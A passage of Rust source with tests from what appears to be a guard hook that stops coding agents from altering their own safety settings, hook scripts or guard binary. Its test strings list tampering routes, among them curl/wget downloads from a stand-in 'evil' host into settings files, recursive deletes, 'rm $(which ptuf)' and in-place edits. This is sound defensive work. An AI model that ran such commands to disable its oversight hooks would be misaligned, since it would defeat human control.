    words.next().is_none().then_some(name)
}

/// The literal components after the last run-time-decided one (`$X`,
/// `$(…)`) of `raw`, when at least two remain (`$D/.claude/settings.json`
/// → `.claude/settings.json`). A lone file name (`$D/config.yaml`) is
/// too generic to match on.
fn literal_tail(raw: &str) -> Option<PathBuf> {
    if !raw.contains('$') {
        return None;
    }
    let comps: Vec<&str> = raw
        .split('/')
        .filter(|c| !c.is_empty() && *c != ".")
        .collect();
    let last_dynamic = comps
        .iter()
        .rposition(|c| c.contains(['$', '(', ')', '`']))?;
    let tail = &comps[last_dynamic + 1..];
    (tail.len() >= 2).then(|| tail.iter().collect())
}

/// Component-wise glob match (`*`, `?`, `[…]` within one component).
/// With `prefix`, the pattern may also match a leading directory of
/// `target` (the target sits under a matched directory).
fn path_glob_matches(pattern: &Path, target: &Path, prefix: bool) -> bool {
    let p: Vec<_> = pattern.components().collect();
    let t: Vec<_> = target.components().collect();
    let len_ok = if prefix {
        p.len() <= t.len()
    } else {
        p.len() == t.len()
    };
    len_ok
        && p.iter().zip(&t).all(|(pc, tc)| {
            match (pc.as_os_str().to_str(), tc.as_os_str().to_str()) {
                (Some(pc), Some(tc)) => fnmatch(pc.as_bytes(), tc.as_bytes()),
                _ => pc == tc,
            }
        })
}

/// Shell pattern match of one path component: `*`, `?`, `[set]` /
/// `[!set]` / `[^set]` with ranges. A leading `.` is not matched by a
/// wildcard, as in bash without `dotglob`.
fn fnmatch(pattern: &[u8], text: &[u8]) -> bool {
    if text.first() == Some(&b'.') && pattern.first() != Some(&b'.') {
        return false;
    }
    fnmatch_from(pattern, text)
}

fn fnmatch_from(pattern: &[u8], text: &[u8]) -> bool {
    match pattern.first() {
        None => text.is_empty(),
        Some(b'*') => (0..=text.len()).any(|i| fnmatch_from(&pattern[1..], &text[i..])),
        Some(b'?') => !text.is_empty() && fnmatch_from(&pattern[1..], &text[1..]),
        Some(b'[') => {
            let Some((&c, rest_text)) = text.split_first() else {
                return false;
            };
            let mut i = 1;
            let negate = matches!(pattern.get(1), Some(b'!' | b'^'));
            if negate {
                i += 1;
            }
            let start = i;
            let mut matched = false;
            while i < pattern.len() && (pattern[i] != b']' || i == start) {
                if i + 2 < pattern.len() && pattern[i + 1] == b'-' && pattern[i + 2] != b']' {
                    matched |= (pattern[i]..=pattern[i + 2]).contains(&c);
                    i += 3;
                } else {
                    matched |= pattern[i] == c;
                    i += 1;
                }
            }
            if i >= pattern.len() {
                // Unterminated `[`: literal.
                return c == b'[' && fnmatch_from(&pattern[1..], rest_text);
            }
            matched != negate && fnmatch_from(&pattern[i + 1..], rest_text)
        },
        Some(&p) => text.first() == Some(&p) && fnmatch_from(&pattern[1..], &text[1..]),
    }
}

/// Drop `.` components so `/repo/./.claude/` compares equal to
/// `/repo/.claude` component-wise.
fn lexical_normalize(path: &Path) -> PathBuf {
    path.components()
        .filter(|c| !matches!(c, std::path::Component::CurDir))
        .collect()
}

#[cfg(test)]
mod tests {

    use super::*;
    use crate::config::scope::MapEnv;

    #[test]
    fn protected_kind_round_trip_strings() {
        for k in [
            ProtectedKind::Binary,
            ProtectedKind::Config,
            ProtectedKind::Plugin,
            ProtectedKind::ClaudeSettings,
            ProtectedKind::CodexSettings,
            ProtectedKind::HookScript,
            ProtectedKind::CopilotSettings,
            ProtectedKind::KiroSettings,
            ProtectedKind::PiSettings,
            ProtectedKind::OpencodeSettings,
            ProtectedKind::CursorSettings,
            ProtectedKind::ClineSettings,
        ] {
            assert_ne!(k.as_str().len(), 0);
        }
    }

    #[test]
    fn protected_kinds_defaults_to_empty() {
        let kinds = ProtectedKinds::default();
        assert!(kinds.is_empty());
        assert_eq!(kinds.as_slice(), &[]);
        assert_eq!(kinds.iter().count(), 0);
    }

    #[test]
    fn protected_kinds_push_unique_preserves_order() {
        let mut kinds = ProtectedKinds::new();
        kinds.push_unique(ProtectedKind::Config);
        kinds.push_unique(ProtectedKind::Plugin);
        kinds.push_unique(ProtectedKind::Config);

        assert!(!kinds.is_empty());
        assert!(kinds.contains(&ProtectedKind::Config));
        assert!(kinds.contains(&ProtectedKind::Plugin));
        assert!(!kinds.contains(&ProtectedKind::Binary));
        assert_eq!(
            kinds.as_slice(),
            &[ProtectedKind::Config, ProtectedKind::Plugin]
        );
    }

    #[test]
    fn protected_kinds_from_slice_deduplicates() {
        let kinds = ProtectedKinds::from(
            [
                ProtectedKind::HookScript,
                ProtectedKind::HookScript,
                ProtectedKind::Binary,
            ]
            .as_slice(),
        );
        let collected: Vec<_> = kinds.iter().copied().collect();
        assert_eq!(
            collected,
            vec![ProtectedKind::HookScript, ProtectedKind::Binary]
        );
    }

    #[test]
    fn collect_includes_repo_local_claude_settings() {
        let env = MapEnv::new(&[("HOME", "/h")]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &cfg, &env);
        assert!(
            p.claude_settings
                .iter()
                .any(|q| q == &PathBuf::from("/repo/.claude/settings.json"))
        );
        assert!(
            p.claude_settings
                .iter()
                .any(|q| q == &PathBuf::from("/h/.claude/settings.json"))
        );
        assert!(
            p.codex_settings
                .iter()
                .any(|q| q == &PathBuf::from("/repo/.codex/config.toml"))
        );
        assert!(
            p.codex_settings
                .iter()
                .any(|q| q == &PathBuf::from("/h/.codex/hooks.json"))
        );
    }

    #[test]
    fn classify_matches_edit_of_local_claude_settings() {
        let env = MapEnv::new(&[("HOME", "/h")]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &cfg, &env);
        let input = HookInput {
            tool_name: "Edit".into(),
            tool_input: serde_json::json!({ "file_path": "/repo/.claude/settings.json" }),
        };
        let labels = p.classify_input(&input);
        assert!(labels.contains(&ProtectedKind::ClaudeSettings));
    }

    #[test]
    fn classify_matches_rm_on_protected_path() {
        let env = MapEnv::new(&[("HOME", "/h")]);
        let mut cfg = Config::default();
        cfg.plugin_paths.push(PathBuf::from("/repo/plugin.yaml"));
        let p = ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &cfg, &env);
        let input = HookInput {
            tool_name: "Bash".into(),
            tool_input: serde_json::json!({ "command": "rm -f /repo/plugin.yaml" }),
        };
        let labels = p.classify_input(&input);
        assert!(labels.contains(&ProtectedKind::Plugin));
    }

    #[test]
    fn classify_matches_apply_patch_edit_of_repo_local_codex_settings() {
        let env = MapEnv::new(&[("HOME", "/h")]);
        let cfg = Config::default();
        let dir = std::env::temp_dir().join(format!(
            "ptuf-self-paths-codex-{}-{}",
            std::process::id(),
            line!()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join(".codex")).expect("mkdir");
        std::fs::write(dir.join(".codex/config.toml"), "").expect("touch");
        let p = ProtectedPaths::collect_with_env(Some(&dir), &cfg, &env);
        let input = HookInput {
            tool_name: "apply_patch".into(),
            tool_input: serde_json::json!({
                "command": "*** Begin Patch\n*** Update File: .codex/config.toml\n*** End Patch\n"
            }),
        };
        let labels = p.classify_input(&input);
        assert!(labels.contains(&ProtectedKind::CodexSettings));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn classify_does_not_match_bare_relative_name_by_suffix() {
        let env = MapEnv::new(&[("HOME", "/h")]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &cfg, &env);
        let input = HookInput {
            tool_name: "apply_patch".into(),
            tool_input: serde_json::json!({
                "command": "*** Begin Patch\n*** Update File: settings.json\n*** End Patch\n"
            }),
        };
        assert!(p.classify_input(&input).is_empty());
    }

    #[test]
    fn classify_matches_sudo_writer_via_positional_unwrap() {
        let env = MapEnv::new(&[("HOME", "/h")]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &cfg, &env);
        let input = HookInput {
            tool_name: "Bash".into(),
            tool_input: serde_json::json!({
                "command": "sudo rm -f /repo/.claude/settings.json"
            }),
        };
        let labels = p.classify_input(&input);
        assert!(labels.contains(&ProtectedKind::ClaudeSettings));
    }

    #[test]
    fn collect_extracts_hook_scripts_from_claude_settings() {
        let dir = std::env::temp_dir().join(format!(
            "ptuf-self-paths-{}-{}",
            std::process::id(),
            line!()
        ));
        let home = dir.join("home");
        std::fs::create_dir_all(home.join(".claude")).expect("mkdir");
        std::fs::write(
            home.join(".claude/settings.json"),
            r#"{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          { "type": "command", "command": "./hooks/guard.sh hook claude-code" }
        ]
      }
    ]
  }
}"#,
        )
        .expect("write settings");
        let home_string = home.to_string_lossy().into_owned();
        let env = MapEnv::new(&[("HOME", home_string.as_str())]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &cfg, &env);
        assert!(
            p.hook_scripts
                .iter()
                .any(|path| path == &PathBuf::from("/repo/./hooks/guard.sh"))
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn relative_hook_command_canonicalizes_against_settings_dir() {
        // A relative hook command (`./hooks/guard.sh`) and a candidate
        // edit on the same physical file must converge on the same
        // `ProtectedKind` regardless of whether either side carries a
        // leading `./`.
        let dir = std::env::temp_dir().join(format!(
            "ptuf-self-paths-canonical-{}-{}",
            std::process::id(),
            line!()
        ));
        let home = dir.join("home");
        let hooks_dir = home.join(".claude/hooks");
        std::fs::create_dir_all(&hooks_dir).expect("mkdir hooks");
        std::fs::write(
            home.join(".claude/settings.json"),
            r#"{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          { "type": "command", "command": "./hooks/guard.sh hook claude-code" }
        ]
      }
    ]
  }
}"#,
        )
        .expect("write settings");
        let guard = hooks_dir.join("guard.sh");
        std::fs::write(&guard, "#!/bin/sh\n").expect("write guard");
        let home_string = home.to_string_lossy().into_owned();
        let env = MapEnv::new(&[("HOME", home_string.as_str())]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(None, &cfg, &env);
        let candidate = guard
            .canonicalize()
            .expect("guard.sh canonicalises to a real path");
        let input = HookInput {
            tool_name: "Edit".into(),
            tool_input: serde_json::json!({
                "file_path": candidate.to_str().expect("utf-8"),
            }),
        };
        let labels = p.classify_input(&input);
        assert!(
            labels.contains(&ProtectedKind::HookScript),
            "expected HookScript classification, got {labels:?} (hook_scripts: {:?})",
            p.hook_scripts,
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn collect_extracts_hook_scripts_from_codex_hooks_json() {
        let dir = std::env::temp_dir().join(format!(
            "ptuf-self-paths-codex-hooks-{}-{}",
            std::process::id(),
            line!()
        ));
        let home = dir.join("home");
        std::fs::create_dir_all(home.join(".codex")).expect("mkdir");
        std::fs::write(
            home.join(".codex/hooks.json"),
            r#"{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash|apply_patch|mcp__.*",
        "hooks": [
          { "type": "command", "command": "./hooks/guard.sh hook codex" }
        ]
      }
    ]
  }
}"#,
        )
        .expect("write settings");
        let home_string = home.to_string_lossy().into_owned();
        let env = MapEnv::new(&[("HOME", home_string.as_str())]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &cfg, &env);
        assert!(
            p.hook_scripts
                .iter()
                .any(|path| path == &PathBuf::from("/repo/./hooks/guard.sh"))
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn classify_matches_nested_mcp_path_on_hook_script() {
        let p = ProtectedPaths {
            hook_scripts: vec![PathBuf::from("/repo/hooks/guard.sh")],
            ..ProtectedPaths::default()
        };
        let input = HookInput {
            tool_name: "mcp__github__push_files".into(),
            tool_input: serde_json::json!({
                "files": [{"path": "/repo/hooks/guard.sh"}]
            }),
        };
        let labels = p.classify_input(&input);
        assert!(labels.contains(&ProtectedKind::HookScript));
    }

    #[test]
    fn classify_returns_empty_for_unrelated_input() {
        let env = MapEnv::new(&[("HOME", "/h")]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &cfg, &env);
        let input = HookInput {
            tool_name: "Bash".into(),
            tool_input: serde_json::json!({ "command": "ls -la" }),
        };
        assert!(p.classify_input(&input).is_empty());
    }

    #[test]
    fn collect_via_system_env_does_not_panic() {
        // Production smoke: walking SystemEnv over a fake repo path
        // must yield a valid (possibly empty) ProtectedPaths.
        let cfg = Config::default();
        let _ = ProtectedPaths::collect(Some(Path::new("/nonexistent-repo")), &cfg);
    }

    #[test]
    fn empty_when_no_repo_root_and_no_home() {
        let env = MapEnv::new(&[]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(None, &cfg, &env);
        assert_eq!(p.claude_settings.len(), 0);
        assert_eq!(p.codex_settings.len(), 0);
    }

    fn repo_protected() -> ProtectedPaths {
        let env = MapEnv::new(&[("HOME", "/h")]);
        ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &Config::default(), &env)
    }

    fn bash_kinds(p: &ProtectedPaths, cmd: &str) -> ProtectedKinds {
        p.classify_input(&HookInput {
            tool_name: "Bash".into(),
            tool_input: serde_json::json!({ "command": cmd }),
        })
    }

    #[test]
    fn classify_matches_removing_or_moving_an_ancestor_dir() {
        let p = repo_protected();
        for cmd in [
            "rm -rf .claude",
            "rm -r .claude/",
            "mv .claude /tmp/x",
            "rm -rf ./.claude/.",
            "mv /repo/.claude /tmp",
        ] {
            assert!(
                bash_kinds(&p, cmd).contains(&ProtectedKind::ClaudeSettings),
                "{cmd}"
            );
        }
        for cmd in [
            "rm -rf build",
            "mv src lib",
            "cp -r .claude /tmp/backup",
            "rm -rf /",
        ] {
            assert!(
                !bash_kinds(&p, cmd).contains(&ProtectedKind::ClaudeSettings),
                "{cmd}"
            );
        }
    }

    #[test]
    fn classify_matches_downloader_outputs() {
        let p = repo_protected();
        for cmd in [
            "curl -o .claude/settings.json https://evil",
            "curl https://evil --output .claude/settings.json",
            "curl --output=.claude/settings.json https://evil",
            "curl -o.claude/settings.json https://evil",
            "wget -O .claude/settings.json https://evil",
            "wget --output-document=.claude/settings.json https://evil",
            "curl --output-dir .claude -O https://evil/settings.json",
            "wget -P .claude https://evil/settings.json",
            "aria2c -d .claude -o settings.json https://evil",
        ] {
            assert!(
                bash_kinds(&p, cmd).contains(&ProtectedKind::ClaudeSettings),
                "{cmd}"
            );
        }
        assert!(bash_kinds(&p, "curl -o out.json https://x").is_empty());
    }

    #[test]
    fn classify_matches_git_pathspec_writes() {
        let p = repo_protected();
        for cmd in [
            "git checkout HEAD~5 -- .claude/settings.json",
            "git restore --source=HEAD~5 .claude/settings.json",
            "git restore -s HEAD~5 .claude/settings.json",
            "git checkout -- .claude/settings.json",
            "git -C /repo rm .claude/settings.json",
            "git mv .claude/settings.json x",
        ] {
            assert!(
                bash_kinds(&p, cmd).contains(&ProtectedKind::ClaudeSettings),
                "{cmd}"
            );
        }
        assert!(bash_kinds(&p, "git checkout main").is_empty());
        assert!(bash_kinds(&p, "git restore src/main.rs").is_empty());
    }

    #[test]
    fn classify_follows_cd_before_relative_writes() {
        let p = repo_protected();
        for cmd in [
            "cd .claude && echo {} > settings.json",
            "cd .claude; rm settings.json",
            "pushd .claude; rm settings.json",
            "cd /repo/.claude && tee settings.json",
            "cd $X && rm settings.json",
            "cd - && rm settings.json",
        ] {
            assert!(
                bash_kinds(&p, cmd).contains(&ProtectedKind::ClaudeSettings),
                "{cmd}"
            );
        }
        assert!(bash_kinds(&p, "cd src && echo x > a.txt").is_empty());
        assert!(bash_kinds(&p, "cd .claude && echo x > notes.txt").is_empty());
    }

    #[test]
    fn classify_resolves_cwd_references_and_which_lookups() {
        let p = ProtectedPaths {
            binary: Some(PathBuf::from("/usr/local/bin/ptuf")),
            ..repo_protected()
        };
        for cmd in [
            "echo {} > $PWD/.claude/settings.json",
            "echo {} > ${PWD}/.claude/settings.json",
            "echo {} > \"$(pwd)/.claude/settings.json\"",
            "echo x > $OUT/.claude/settings.json",
        ] {
            assert!(
                bash_kinds(&p, cmd).contains(&ProtectedKind::ClaudeSettings),
                "{cmd}"
            );
        }
        for cmd in [
            "rm $(which ptuf)",
            "cp /bin/true $(command -v ptuf)",
            "rm $(type -P ptuf)",
        ] {
            assert!(
                bash_kinds(&p, cmd).contains(&ProtectedKind::Binary),
                "{cmd}"
            );
        }
        for cmd in [
            "echo x > $OUT/config.yaml",
            "rm $(which node)",
            "cp a \"$PWD/out.txt\"",
        ] {
            assert!(bash_kinds(&p, cmd).is_empty(), "{cmd}");
        }
    }

    #[test]
    fn classify_matches_glob_write_targets() {
        let p = repo_protected();
        for cmd in [
            "echo {} > .clau*/settings.json",
            "echo {} > .claude/settings.js?n",
            "echo {} > .claude/[s]ettings.json",
            "rm .claude/*.json",
            "rm -rf .c*",
        ] {
            assert!(
                bash_kinds(&p, cmd).contains(&ProtectedKind::ClaudeSettings),
                "{cmd}"
            );
        }
        for cmd in [
            "rm *.txt",
            "rm -rf src/*",
            "echo hi > out*.log",
            "rm .claude/*.md",
        ] {
            assert!(bash_kinds(&p, cmd).is_empty(), "{cmd}");
        }
    }

    #[test]
    fn classify_matches_in_place_editors() {
        let p = repo_protected();
        for cmd in [
            "jq . .claude/settings.json | sponge .claude/settings.json",
            "patch .claude/settings.json < p",
            "ed .claude/settings.json",
            "awk -i inplace '{}' .claude/settings.json",
            "gawk -iinplace '{}' .claude/settings.json",
            "perl -pi -e 's/a/b/' .claude/settings.json",
            "ruby -i -pe '1' .claude/settings.json",
        ] {
            assert!(
                bash_kinds(&p, cmd).contains(&ProtectedKind::ClaudeSettings),
                "{cmd}"
            );
        }
        assert!(bash_kinds(&p, "awk '{print}' .claude/settings.json").is_empty());
        assert!(bash_kinds(&p, "perl -ne 'print' .claude/settings.json").is_empty());
    }

    #[test]
    fn fnmatch_follows_shell_rules() {
        assert!(fnmatch(b"*.json", b"settings.json"));
        assert!(fnmatch(b"se?tings.js[a-z]n", b"settings.json"));
        assert!(fnmatch(b"[!x]*", b"settings"));
        assert!(!fnmatch(b"*", b".claude"));
        assert!(fnmatch(b".c*", b".claude"));
        assert!(fnmatch(b"a[", b"a["));
        assert!(!fnmatch(b"[^s]*", b"settings"));
    }

    #[test]
    fn classify_input_prepared_includes_extra_slice() {
        // The pair variant must classify the union of `paths` and
        // `extra` without forcing a merged Vec. A Bash redirect target
        // arrives via `extra` and should still hit the matching kind.
        let env = MapEnv::new(&[("HOME", "/h")]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &cfg, &env);
        let input = HookInput {
            tool_name: "Bash".into(),
            tool_input: serde_json::json!({ "command": "ls" }),
        };
        let extra = vec![crate::facts::path::PathFact::from_raw(
            "/repo/.claude/settings.json".into(),
            crate::facts::path::PathTool::Write,
            crate::facts::path::PathOrigin::BashRedirect,
            Some(Path::new("/repo")),
            &env,
        )];
        let labels = p.classify_input_prepared(&input, &[], &extra, None);
        assert!(labels.contains(&ProtectedKind::ClaudeSettings));
    }

    #[test]
    fn collect_includes_repo_local_copilot_settings() {
        let env = MapEnv::new(&[("HOME", "/h")]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &cfg, &env);
        assert!(
            p.copilot_settings
                .iter()
                .any(|q| q == &PathBuf::from("/repo/.github/hooks/ptuf.json"))
        );
    }

    #[test]
    fn collect_enumerates_every_kiro_agent_json_in_both_scopes() {
        let dir = std::env::temp_dir().join(format!(
            "ptuf-self-paths-kiro-enum-{}-{}",
            std::process::id(),
            line!()
        ));
        let repo = dir.join("repo");
        let home = dir.join("home");
        std::fs::create_dir_all(repo.join(".kiro/agents")).expect("mkdir repo agents");
        std::fs::create_dir_all(home.join(".kiro/agents")).expect("mkdir home agents");
        std::fs::write(repo.join(".kiro/agents/code-reviewer.json"), "{}").expect("write a");
        std::fs::write(repo.join(".kiro/agents/build.json"), "{}").expect("write b");
        std::fs::write(repo.join(".kiro/agents/notes.md"), "ignored").expect("write md");
        std::fs::write(home.join(".kiro/agents/default.json"), "{}").expect("write home");

        let home_string = home.to_string_lossy().into_owned();
        let env = MapEnv::new(&[("HOME", home_string.as_str())]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(&repo), &cfg, &env);

        let canon = |p: PathBuf| p.canonicalize().unwrap_or(p);
        let expected_a = canon(repo.join(".kiro/agents/code-reviewer.json"));
        let expected_b = canon(repo.join(".kiro/agents/build.json"));
        let expected_home = canon(home.join(".kiro/agents/default.json"));
        let ignored_md = canon(repo.join(".kiro/agents/notes.md"));

        assert!(p.kiro_settings.iter().any(|q| q == &expected_a));
        assert!(p.kiro_settings.iter().any(|q| q == &expected_b));
        assert!(p.kiro_settings.iter().any(|q| q == &expected_home));
        assert!(
            !p.kiro_settings.iter().any(|q| q == &ignored_md),
            "non-json agent should be excluded, got {:?}",
            p.kiro_settings
        );

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn collect_kiro_settings_is_only_managed_hook_file_when_dirs_missing() {
        let env = MapEnv::new(&[("HOME", "/h")]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &cfg, &env);
        assert_eq!(
            p.kiro_settings,
            vec![
                PathBuf::from("/h/.kiro/hooks/ptuf.json"),
                PathBuf::from("/repo/.kiro/hooks/ptuf.json"),
            ],
            "no .kiro dirs should leave only the managed v3 hook file protected",
        );
    }

    #[test]
    fn collect_enumerates_kiro_v3_hook_documents_and_their_scripts() {
        let dir = std::env::temp_dir().join(format!(
            "ptuf-self-paths-kiro-v3-{}-{}",
            std::process::id(),
            line!()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        let repo = dir.join("repo");
        let home = dir.join("home");
        std::fs::create_dir_all(repo.join(".kiro/hooks")).expect("mkdir repo hooks");
        std::fs::create_dir_all(home.join(".kiro/agents")).expect("mkdir home agents");
        std::fs::write(
            repo.join(".kiro/hooks/guard.json"),
            r#"{"version":"v1","hooks":[{"name":"g","trigger":"PreToolUse",
                "action":{"type":"command","command":"./hooks/guard.sh hook kiro-v3"}}]}"#,
        )
        .expect("write hook doc");
        std::fs::write(repo.join(".kiro/hooks/notes.txt"), "ignored").expect("write txt");
        std::fs::write(
            home.join(".kiro/agents/dev.json"),
            r#"{"name":"dev","hooks":[{"name":"p","trigger":"PreToolUse",
                "action":{"type":"command","command":"/opt/inline.sh"}}]}"#,
        )
        .expect("write inline profile");
        let home_str = home.to_string_lossy().into_owned();
        let env = MapEnv::new(&[("HOME", home_str.as_str())]);
        let p = ProtectedPaths::collect_with_env(Some(&repo), &Config::default(), &env);
        let canon = |p: PathBuf| p.canonicalize().unwrap_or(p);
        assert!(
            p.kiro_settings
                .contains(&canon(repo.join(".kiro/hooks/guard.json")))
        );
        assert!(
            p.kiro_settings
                .contains(&repo.join(".kiro/hooks/ptuf.json"))
        );
        assert!(
            p.kiro_settings
                .contains(&canon(home.join(".kiro/agents/dev.json")))
        );
        assert!(
            !p.kiro_settings
                .contains(&canon(repo.join(".kiro/hooks/notes.txt")))
        );
        assert!(
            p.hook_scripts.iter().any(|s| s.ends_with("hooks/guard.sh")),
            "standalone hook script must be protected, got {:?}",
            p.hook_scripts
        );
        assert!(
            p.hook_scripts.contains(&PathBuf::from("/opt/inline.sh")),
            "inline profile hook script must be protected, got {:?}",
            p.hook_scripts
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn collect_extracts_hook_scripts_from_copilot_hooks_json() {
        let dir = std::env::temp_dir().join(format!(
            "ptuf-self-paths-copilot-{}-{}",
            std::process::id(),
            line!()
        ));
        std::fs::create_dir_all(dir.join(".github/hooks")).expect("mkdir");
        std::fs::write(
            dir.join(".github/hooks/ptuf.json"),
            r#"{
  "hooks": {
    "preToolUse": [
      {
        "bash": "./hooks/guard.sh hook copilot",
        "powershell": "./hooks/guard.sh hook copilot"
      }
    ]
  }
}"#,
        )
        .expect("write hooks");
        let env = MapEnv::new(&[("HOME", "/h")]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(&dir), &cfg, &env);
        assert!(
            p.hook_scripts
                .iter()
                .any(|path| path == &dir.join("./hooks/guard.sh")),
            "expected hook script from copilot hooks.json, got {:?}",
            p.hook_scripts
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn collect_extracts_hook_scripts_from_kiro_hooks_json() {
        let dir = std::env::temp_dir().join(format!(
            "ptuf-self-paths-kiro-{}-{}",
            std::process::id(),
            line!()
        ));
        std::fs::create_dir_all(dir.join(".kiro/agents")).expect("mkdir");
        std::fs::write(
            dir.join(".kiro/agents/ptuf-guarded.json"),
            r#"{
  "hooks": {
    "preToolUse": [
      {
        "command": "./hooks/guard.sh hook kiro"
      }
    ]
  }
}"#,
        )
        .expect("write agent");
        let env = MapEnv::new(&[("HOME", "/h")]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(&dir), &cfg, &env);
        assert!(
            p.hook_scripts
                .iter()
                .any(|path| path == &dir.join("./hooks/guard.sh")),
            "expected hook script from kiro ptuf-guarded.json, got {:?}",
            p.hook_scripts
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn classify_matches_edit_of_copilot_settings() {
        let p = ProtectedPaths {
            copilot_settings: vec![PathBuf::from("/repo/.github/hooks/ptuf.json")],
            ..ProtectedPaths::default()
        };
        let input = HookInput {
            tool_name: "Edit".into(),
            tool_input: serde_json::json!({
                "file_path": "/repo/.github/hooks/ptuf.json"
            }),
        };
        let labels = p.classify_input(&input);
        assert!(labels.contains(&ProtectedKind::CopilotSettings));
    }

    #[test]
    fn classify_matches_edit_of_kiro_settings() {
        let p = ProtectedPaths {
            kiro_settings: vec![PathBuf::from("/repo/.kiro/agents/ptuf-guarded.json")],
            ..ProtectedPaths::default()
        };
        let input = HookInput {
            tool_name: "Edit".into(),
            tool_input: serde_json::json!({
                "file_path": "/repo/.kiro/agents/ptuf-guarded.json"
            }),
        };
        let labels = p.classify_input(&input);
        assert!(labels.contains(&ProtectedKind::KiroSettings));
    }

    #[test]
    fn collect_includes_pi_settings_paths() {
        let dir =
            std::env::temp_dir().join(format!("ptuf-self-pi-{}-{}", std::process::id(), line!()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join(".git")).expect("mkdir .git");
        std::fs::create_dir_all(dir.join(".pi/extensions")).expect("mkdir .pi");
        let home = dir.join("home");
        std::fs::create_dir_all(home.join(".pi/agent/extensions")).expect("mkdir agent");
        let home_string = home.to_string_lossy().into_owned();
        let env = MapEnv::new(&[("HOME", home_string.as_str())]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(&dir), &cfg, &env);
        assert!(
            p.pi_settings
                .iter()
                .any(|q| q == &dir.join(".pi/extensions/ptuf.ts"))
        );
        assert!(
            p.pi_settings
                .iter()
                .any(|q| q == &home.join(".pi/agent/extensions/ptuf.ts"))
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn classify_matches_edit_of_pi_settings() {
        let p = ProtectedPaths {
            pi_settings: vec![PathBuf::from("/repo/.pi/extensions/ptuf.ts")],
            ..ProtectedPaths::default()
        };
        let input = HookInput {
            tool_name: "Write".into(),
            tool_input: serde_json::json!({
                "file_path": "/repo/.pi/extensions/ptuf.ts"
            }),
        };
        let labels = p.classify_input(&input);
        assert!(labels.contains(&ProtectedKind::PiSettings));
    }

    #[test]
    fn protected_kind_pi_settings_as_str() {
        assert_eq!(ProtectedKind::PiSettings.as_str(), "pi_settings");
    }

    #[test]
    fn collect_includes_opencode_settings_paths() {
        let dir =
            std::env::temp_dir().join(format!("ptuf-self-oc-{}-{}", std::process::id(), line!()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join(".git")).expect("mkdir .git");
        std::fs::create_dir_all(dir.join(".opencode/plugins")).expect("mkdir opencode");
        let home = dir.join("home");
        std::fs::create_dir_all(home.join(".config/opencode/plugins")).expect("mkdir config");
        let home_string = home.to_string_lossy().into_owned();
        let env = MapEnv::new(&[
            ("HOME", home_string.as_str()),
            ("XDG_CONFIG_HOME", "/xdg/opencode-config"),
        ]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(&dir), &cfg, &env);
        assert!(
            p.opencode_settings
                .iter()
                .any(|q| q == &PathBuf::from("/xdg/opencode-config/opencode/plugins/ptuf.ts"))
        );
        assert!(
            p.opencode_settings
                .iter()
                .any(|q| q == &PathBuf::from("/xdg/opencode-config/opencode/plugin/ptuf.ts"))
        );
        assert!(
            p.opencode_settings
                .iter()
                .any(|q| q == &dir.join(".opencode/plugins/ptuf.ts"))
        );
        assert!(
            p.opencode_settings
                .iter()
                .any(|q| q == &dir.join(".opencode/plugin/ptuf.ts"))
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn collect_opencode_settings_falls_back_to_home_dot_config_without_xdg() {
        let dir = std::env::temp_dir().join(format!(
            "ptuf-self-oc-fallback-{}-{}",
            std::process::id(),
            line!()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        let home = dir.join("home");
        std::fs::create_dir_all(home.join(".config/opencode/plugins")).expect("mkdir config");
        let home_string = home.to_string_lossy().into_owned();
        let env = MapEnv::new(&[("HOME", home_string.as_str())]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(None, &cfg, &env);
        assert!(
            p.opencode_settings
                .iter()
                .any(|q| q == &home.join(".config/opencode/plugins/ptuf.ts"))
        );
        assert!(
            p.opencode_settings
                .iter()
                .any(|q| q == &home.join(".config/opencode/plugin/ptuf.ts"))
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn classify_matches_edit_of_opencode_settings() {
        let p = ProtectedPaths {
